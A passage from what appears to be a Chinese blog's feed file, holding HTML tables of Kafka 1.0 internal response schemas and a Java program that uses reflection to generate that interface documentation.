style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>brokers</td><td>ARRAY({node_id:INT32,host:STRING,port:INT32,rack:NULLABLE_STRING})</td><td>null</td><td>Host and port information for all brokers.</td></tr><tr><td>cluster_id</td><td>NULLABLE_STRING</td><td>null</td><td>The cluster id that this broker belongs to.</td></tr><tr><td>controller_id</td><td>INT32</td><td>null</td><td>The broker id of the controller broker.</td></tr><tr><td>topic_metadata</td><td>ARRAY({error_code:INT16,topic:STRING,is_internal:BOOLEAN,partition_metadata:ARRAY({error_code:INT16,partition:INT32,leader:INT32,replicas:ARRAY(INT32),isr:ARRAY(INT32)})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-4-1"><a href="#version-4-1" class="headerlink" title="version:4"></a>version:4</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>brokers</td><td>ARRAY({node_id:INT32,host:STRING,port:INT32,rack:NULLABLE_STRING})</td><td>null</td><td>Host and port information for all brokers.</td></tr><tr><td>cluster_id</td><td>NULLABLE_STRING</td><td>null</td><td>The cluster id that this broker belongs to.</td></tr><tr><td>controller_id</td><td>INT32</td><td>null</td><td>The broker id of the controller broker.</td></tr><tr><td>topic_metadata</td><td>ARRAY({error_code:INT16,topic:STRING,is_internal:BOOLEAN,partition_metadata:ARRAY({error_code:INT16,partition:INT32,leader:INT32,replicas:ARRAY(INT32),isr:ARRAY(INT32)})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-5-1"><a href="#version-5-1" class="headerlink" title="version:5"></a>version:5</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>brokers</td><td>ARRAY({node_id:INT32,host:STRING,port:INT32,rack:NULLABLE_STRING})</td><td>null</td><td>Host and port information for all brokers.</td></tr><tr><td>cluster_id</td><td>NULLABLE_STRING</td><td>null</td><td>The cluster id that this broker belongs to.</td></tr><tr><td>controller_id</td><td>INT32</td><td>null</td><td>The broker id of the controller broker.</td></tr><tr><td>topic_metadata</td><td>ARRAY({error_code:INT16,topic:STRING,is_internal:BOOLEAN,partition_metadata:ARRAY({error_code:INT16,partition:INT32,leader:INT32,replicas:ARRAY(INT32),isr:ARRAY(INT32),offline_replicas:ARRAY(INT32)})})</td><td>null</td><td>null</td></tr></table>  <h2 id="OffsetCommitResponse"><a href="#OffsetCommitResponse" class="headerlink" title="OffsetCommitResponse"></a>OffsetCommitResponse</h2><h3 id="version-0-27"><a href="#version-0-27" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,error_code:INT16})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-1-14"><a href="#version-1-14" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,error_code:INT16})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-2-5"><a href="#version-2-5" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,error_code:INT16})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-3-2"><a href="#version-3-2" class="headerlink" title="version:3"></a>version:3</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,error_code:INT16})})</td><td>null</td><td>null</td></tr></table>  <h2 id="OffsetFetchResponse"><a href="#OffsetFetchResponse" class="headerlink" title="OffsetFetchResponse"></a>OffsetFetchResponse</h2><h3 id="version-0-28"><a href="#version-0-28" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,offset:INT64,metadata:NULLABLE_STRING,error_code:INT16})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-1-15"><a href="#version-1-15" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,offset:INT64,metadata:NULLABLE_STRING,error_code:INT16})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-2-6"><a href="#version-2-6" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,offset:INT64,metadata:NULLABLE_STRING,error_code:INT16})})</td><td>null</td><td>null</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr></table>  <h3 id="version-3-3"><a href="#version-3-3" class="headerlink" title="version:3"></a>version:3</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,offset:INT64,metadata:NULLABLE_STRING,error_code:INT16})})</td><td>null</td><td>null</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr></table>  <h2 id="OffsetsForLeaderEpochResponse"><a href="#OffsetsForLeaderEpochResponse" class="headerlink" title="OffsetsForLeaderEpochResponse"></a>OffsetsForLeaderEpochResponse</h2><h3 id="version-0-29"><a href="#version-0-29" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({error_code:INT16,partition:INT32,end_offset:INT64})})</td><td>null</td><td>An array of topics for which we have leader offsets for some requested Partition Leader Epoch</td></tr></table>  <h2 id="ProduceResponse"><a href="#ProduceResponse" class="headerlink" title="ProduceResponse"></a>ProduceResponse</h2><h3 id="version-0-30"><a href="#version-0-30" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,error_code:INT16,base_offset:INT64})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-1-16"><a href="#version-1-16" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,error_code:INT16,base_offset:INT64})})</td><td>null</td><td>null</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr></table>  <h3 id="version-2-7"><a href="#version-2-7" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,error_code:INT16,base_offset:INT64,log_append_time:INT64})})</td><td>null</td><td>null</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr></table>  <h3 id="version-3-4"><a href="#version-3-4" class="headerlink" title="version:3"></a>version:3</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,error_code:INT16,base_offset:INT64,log_append_time:INT64})})</td><td>null</td><td>null</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr></table>  <h3 id="version-4-2"><a href="#version-4-2" class="headerlink" title="version:4"></a>version:4</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,error_code:INT16,base_offset:INT64,log_append_time:INT64})})</td><td>null</td><td>null</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr></table>  <h3 id="version-5-2"><a href="#version-5-2" class="headerlink" title="version:5"></a>version:5</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,error_code:INT16,base_offset:INT64,log_append_time:INT64,log_start_offset:INT64})})</td><td>null</td><td>null</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr></table>  <h2 id="SaslAuthenticateResponse"><a href="#SaslAuthenticateResponse" class="headerlink" title="SaslAuthenticateResponse"></a>SaslAuthenticateResponse</h2><h3 id="version-0-31"><a href="#version-0-31" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>error_message</td><td>NULLABLE_STRING</td><td>null</td><td>Response error message</td></tr><tr><td>sasl_auth_bytes</td><td>BYTES</td><td>null</td><td>SASL authentication bytes from server as defined by the SASL mechanism.</td></tr></table>  <h2 id="SaslHandshakeResponse"><a href="#SaslHandshakeResponse" class="headerlink" title="SaslHandshakeResponse"></a>SaslHandshakeResponse</h2><h3 id="version-0-32"><a href="#version-0-32" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>enabled_mechanisms</td><td>ARRAY(STRING)</td><td>null</td><td>Array of mechanisms enabled in the server.</td></tr></table>  <h3 id="version-1-17"><a href="#version-1-17" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>enabled_mechanisms</td><td>ARRAY(STRING)</td><td>null</td><td>Array of mechanisms enabled in the server.</td></tr></table>  <h2 id="StopReplicaResponse"><a href="#StopReplicaResponse" class="headerlink" title="StopReplicaResponse"></a>StopReplicaResponse</h2><h3 id="version-0-33"><a href="#version-0-33" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>partitions</td><td>ARRAY({topic:STRING,partition:INT32,error_code:INT16})</td><td>null</td><td>null</td></tr></table>  <h2 id="SyncGroupResponse"><a href="#SyncGroupResponse" class="headerlink" title="SyncGroupResponse"></a>SyncGroupResponse</h2><h3 id="version-0-34"><a href="#version-0-34" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>member_assignment</td><td>BYTES</td><td>null</td><td>null</td></tr></table>  <h3 id="version-1-18"><a href="#version-1-18" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>member_assignment</td><td>BYTES</td><td>null</td><td>null</td></tr></table>  <h2 id="TxnOffsetCommitResponse"><a href="#TxnOffsetCommitResponse" class="headerlink" title="TxnOffsetCommitResponse"></a>TxnOffsetCommitResponse</h2><h3 id="version-0-35"><a href="#version-0-35" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,error_code:INT16})})</td><td>null</td><td>Errors per partition from writing markers.</td></tr></table>  <h2 id="UpdateMetadataResponse"><a href="#UpdateMetadataResponse" class="headerlink" title="UpdateMetadataResponse"></a>UpdateMetadataResponse</h2><h3 id="version-0-36"><a href="#version-0-36" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr></table>  <h3 id="version-1-19"><a href="#version-1-19" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr></table>  <h3 id="version-2-8"><a href="#version-2-8" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr></table>  <h3 id="version-3-5"><a href="#version-3-5" class="headerlink" title="version:3"></a>version:3</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr></table>  <h3 id="version-4-3"><a href="#version-4-3" class="headerlink" title="version:4"></a>version:4</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr></table>  <h2 id="WriteTxnMarkersResponse"><a href="#WriteTxnMarkersResponse" class="headerlink" title="WriteTxnMarkersResponse"></a>WriteTxnMarkersResponse</h2><h3 id="version-0-37"><a href="#version-0-37" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>transaction_markers</td><td>ARRAY({producer_id:INT64,topics:ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,error_code:INT16})})})</td><td>null</td><td>Errors per partition from writing markers.</td></tr></table>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>kafka1.0源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>生成kafka内部请求与响应的接口文档</title>
    <link href="/2020/04/22/kafka1-0-generate-rpc-doc/"/>
    <url>/2020/04/22/kafka1-0-generate-rpc-doc/</url>
    
    <content type="html"><![CDATA[<h2 id="生成kafka内部请求与响应的接口文档"><a href="#生成kafka内部请求与响应的接口文档" class="headerlink" title="生成kafka内部请求与响应的接口文档"></a>生成kafka内部请求与响应的接口文档</h2><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> */</span><span class="hljs-keyword">package</span> com.code260.ss.kafka10demo;<span class="hljs-keyword">import</span> java.io.File;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<span class="hljs-keyword">import</span> java.net.URL;<span class="hljs-keyword">import</span> java.net.URLDecoder;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.Enumeration;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> java.util.jar.JarEntry;<span class="hljs-keyword">import</span> java.util.jar.JarFile;<span class="hljs-keyword">import</span> org.apache.kafka.common.protocol.types.BoundField;<span class="hljs-keyword">import</span> org.apache.kafka.common.protocol.types.Schema;<span class="hljs-keyword">import</span> org.apache.kafka.common.requests.AbstractRequest;<span class="hljs-keyword">import</span> org.apache.kafka.common.requests.AbstractResponse;<span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@since</span> 2019-08-07</span><span class="hljs-comment"> *</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GenKafkaRequestDoc</span> </span>&#123;<span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> args</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ClassNotFoundException</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;collect(AbstractRequest<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>;System.out.println(<span class="hljs-string">"======="</span>);collect(AbstractResponse<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>;&#125;<span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> sedClazz</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ClassNotFoundException</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">collect</span><span class="hljs-params">(Class&lt;?&gt; sedClazz)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;List&lt;Class&lt;?&gt;&gt; children = getAllChildrenClass(<span class="hljs-string">"org.apache.kafka"</span>, sedClazz);List&lt;Class&lt;?&gt;&gt; childrenOfAbstractRequest = filter(children, sedClazz);<span class="hljs-keyword">for</span> (Class&lt;?&gt; rquestClazz : childrenOfAbstractRequest) &#123;System.out.println(<span class="hljs-string">"\n## "</span> + rquestClazz.getSimpleName());<span class="hljs-keyword">try</span> &#123;Schema[] schemas = (Schema[]) rquestClazz.getDeclaredMethod(<span class="hljs-string">"schemaVersions"</span>).invoke(<span class="hljs-keyword">null</span>);<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; schemas.length; i++) &#123;Schema schema = schemas[i];System.out.println(<span class="hljs-string">"\n### version:"</span> + i);StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer();sb.append(<span class="hljs-string">"&lt;table&gt;&lt;tr&gt;&lt;td style=\"width:160px\"&gt;name&lt;/td&gt;&lt;td&gt;type&lt;/td&gt;&lt;td  style=\"width:80px\"&gt;defaultValue&lt;/td&gt;&lt;td&gt;docString&lt;/td&gt;&lt;/tr&gt;"</span>);<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; schema.fields().length; j++) &#123;BoundField field = schema.fields()[j];sb.append(<span class="hljs-string">"&lt;tr&gt;&lt;td&gt;"</span>).append(field.def.name).append(<span class="hljs-string">"&lt;/td&gt;"</span>);sb.append(<span class="hljs-string">"&lt;td&gt;"</span>).append(field.def.type).append(<span class="hljs-string">"&lt;/td&gt;"</span>);sb.append(<span class="hljs-string">"&lt;td&gt;"</span>).append(field.def.defaultValue).append(<span class="hljs-string">"&lt;/td&gt;"</span>);sb.append(<span class="hljs-string">"&lt;td&gt;"</span>).append(field.def.docString).append(<span class="hljs-string">"&lt;/td&gt;&lt;/tr&gt;"</span>).append(<span class="hljs-string">"\n"</span>);&#125;sb.append(<span class="hljs-string">"&lt;/table&gt;  \n  \n  "</span>);System.out.println(sb.toString());&#125;<span class="hljs-comment">//System.out.println(schemas);</span>&#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;e.printStackTrace();&#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException e) &#123;e.printStackTrace();&#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;e.printStackTrace();&#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;e.printStackTrace();&#125; <span class="hljs-keyword">catch</span> (SecurityException e) &#123;e.printStackTrace();&#125;&#125;&#125;<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Class&lt;?&gt;&gt; filter(List&lt;Class&lt;?&gt;&gt; children, Class&lt;?&gt; parentClazz) &#123;List&lt;Class&lt;?&gt;&gt; result = <span class="hljs-keyword">new</span> ArrayList&lt;Class&lt;?&gt;&gt;();<span class="hljs-keyword">if</span> (children == <span class="hljs-keyword">null</span> || children.isEmpty()) &#123;<span class="hljs-keyword">return</span> result;&#125;<span class="hljs-keyword">for</span> (Class&lt;?&gt; child : children) &#123;<span class="hljs-keyword">if</span> (isAssignedFrom(child, parentClazz)) &#123;result.add(child);&#125;&#125;<span class="hljs-keyword">return</span> result;&#125;<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isAssignedFrom</span><span class="hljs-params">(Class&lt;?&gt; currentClazz, Class&lt;?&gt; targetParentClazz)</span> </span>&#123;<span class="hljs-keyword">if</span> (targetParentClazz == <span class="hljs-keyword">null</span> || currentClazz == <span class="hljs-keyword">null</span>) &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;&#125;<span class="hljs-comment">//Class&lt;?&gt;[] parentInterfaces = currentClazz.getInterfaces();</span>Class&lt;?&gt; parentClazz = currentClazz.getSuperclass();<span class="hljs-keyword">while</span> (parentClazz != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-keyword">if</span> (parentClazz.equals(targetParentClazz)) &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;&#125; <span class="hljs-keyword">else</span> &#123;parentClazz = parentClazz.getSuperclass();&#125;&#125;Class&lt;?&gt;[] parentInterfaces = currentClazz.getInterfaces();<span class="hljs-keyword">return</span> isAssignedFrom(parentInterfaces, targetParentClazz);&#125;<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isAssignedFrom</span><span class="hljs-params">(Class&lt;?&gt;[] parentInterfaces, Class&lt;?&gt; targetParentClazz)</span> </span>&#123;<span class="hljs-keyword">if</span> (parentInterfaces == <span class="hljs-keyword">null</span>) &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;&#125;<span class="hljs-keyword">for</span> (Class&lt;?&gt; ppInterface : parentInterfaces) &#123;<span class="hljs-keyword">if</span> (ppInterface != <span class="hljs-keyword">null</span> &amp;&amp; ppInterface.equals(targetParentClazz)) &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">boolean</span> result = isAssignedFrom(ppInterface.getInterfaces(), targetParentClazz);<span class="hljs-keyword">if</span> (result) &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;&#125;&#125;&#125;<span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;&#125;<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Class&lt;?&gt;&gt; getAllChildrenClass(String scanPackageStr, Class&lt;?&gt; parentClazz)<span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;List&lt;Class&lt;?&gt;&gt; children = <span class="hljs-keyword">new</span> ArrayList&lt;Class&lt;?&gt;&gt;();Enumeration&lt;URL&gt; packageLocations = parentClazz.getClassLoader().getResources(scanPackageStr.replace(<span class="hljs-string">"."</span>, <span class="hljs-string">"/"</span>));<span class="hljs-keyword">while</span> (packageLocations.hasMoreElements()) &#123;URL packageLocation = packageLocations.nextElement();String protocol = packageLocation.getProtocol();<span class="hljs-keyword">if</span> (<span class="hljs-string">"file"</span>.equals(protocol)) &#123;String filePath = URLDecoder.decode(packageLocation.getFile(), <span class="hljs-string">"UTF-8"</span>);findAndAddClassesInPackageByFile(filePath, scanPackageStr, children);&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">"jar"</span>.equals(protocol)) &#123;findAndAddClassesInPackageByJar(packageLocation.getPath(), scanPackageStr, children);&#125;&#125;<span class="hljs-keyword">return</span> children;&#125;<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">findAndAddClassesInPackageByJar</span><span class="hljs-params">(String packageLocation, String packageName,</span></span><span class="hljs-function"><span class="hljs-params">List&lt;Class&lt;?&gt;&gt; clazzList)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;String[] segs = packageLocation.split(<span class="hljs-string">"!"</span>);String jarFilePath = segs[<span class="hljs-number">0</span>].substring(segs[<span class="hljs-number">0</span>].indexOf(<span class="hljs-string">"/"</span>));jarFilePath = URLDecoder.decode(jarFilePath, <span class="hljs-string">"UTF-8"</span>);String packagePath = segs[<span class="hljs-number">1</span>].substring(<span class="hljs-number">1</span>);JarFile jarFile = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">try</span> &#123;jarFile = <span class="hljs-keyword">new</span> JarFile(jarFilePath);Enumeration&lt;JarEntry&gt; entrys = jarFile.entries();<span class="hljs-keyword">while</span> (entrys.hasMoreElements()) &#123;JarEntry jarEntry = entrys.nextElement();String entryName = jarEntry.getName();<span class="hljs-keyword">if</span> (entryName.endsWith(<span class="hljs-string">".class"</span>)) &#123;<span class="hljs-keyword">if</span> (entryName.startsWith(packagePath)) &#123;entryName = entryName.replace(<span class="hljs-string">"/"</span>, <span class="hljs-string">"."</span>).substring(<span class="hljs-number">0</span>, entryName.lastIndexOf(<span class="hljs-string">"."</span>));Class&lt;?&gt; clazz = Thread.currentThread().getContextClassLoader().loadClass(entryName);clazzList.add(clazz);&#125;&#125;&#125;&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;e.printStackTrace();&#125;<span class="hljs-keyword">finally</span> &#123;<span class="hljs-keyword">if</span> (jarFile != <span class="hljs-keyword">null</span>) &#123;jarFile.close();&#125;&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">findAndAddClassesInPackageByFile</span><span class="hljs-params">(String filePath, String packageName,</span></span><span class="hljs-function"><span class="hljs-params">List&lt;Class&lt;?&gt;&gt; clazzList)</span> </span>&#123;File file = <span class="hljs-keyword">new</span> File(filePath);File[] children = file.listFiles();<span class="hljs-keyword">for</span> (File child : children) &#123;<span class="hljs-keyword">if</span> (child.isDirectory()) &#123;findAndAddClassesInPackageByFile(child.getAbsolutePath(), packageName + <span class="hljs-string">"."</span> + child.getName(),clazzList);&#125;<span class="hljs-keyword">if</span> (child.isFile()) &#123;<span class="hljs-keyword">if</span> (!child.getName().endsWith(<span class="hljs-string">".class"</span>)) &#123;<span class="hljs-keyword">continue</span>;&#125;&#125;String childName = child.getName();<span class="hljs-keyword">if</span> (!childName.endsWith(<span class="hljs-string">".class"</span>)) &#123;<span class="hljs-keyword">continue</span>;&#125;String className = packageName + <span class="hljs-string">"."</span> + childName.substring(<span class="hljs-number">0</span>, childName.length() - <span class="hljs-string">".class"</span>.length());<span class="hljs-keyword">try</span> &#123;Class&lt;?&gt; clazz = Thread.currentThread().getContextClassLoader().loadClass(className);clazzList.add(clazz);&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;e.printStackTrace();&#125;&#125;&#125;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>kafka1.0源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单的main方法调用一个加减法函数背后的细节</title>
    <link href="/2020/04/22/c-cpp-call-simple-fun/"/>
    <url>/2020/04/22/c-cpp-call-simple-fun/</url>
    
